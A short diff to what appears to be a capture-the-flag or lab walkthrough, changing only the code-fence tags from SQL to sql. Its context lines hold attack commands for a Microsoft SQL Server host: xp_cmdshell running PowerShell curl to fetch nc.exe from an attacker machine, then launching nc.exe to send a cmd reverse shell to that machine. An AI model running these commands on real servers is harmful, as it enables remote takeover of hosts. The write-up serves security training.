@@ -232,7 +232,7 @@ EXEC xp_cmdshell 'mkdir C:\tmp'
 
 - Curl the `nc.exe` from our vm
 
-```SQL
+```sql
 EXEC xp_cmdshell 'powershell -c curl http://10.8.28.219/nc.exe -o C:\tmp\nc.exe'
 ```
 
@@ -255,7 +255,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 - Execute the `nc.exe`
 
-```SQL
+```sql
 EXEC xp_cmdshell 'C:\tmp\nc.exe -e cmd 10.8.28.219 4444'
 ```
 
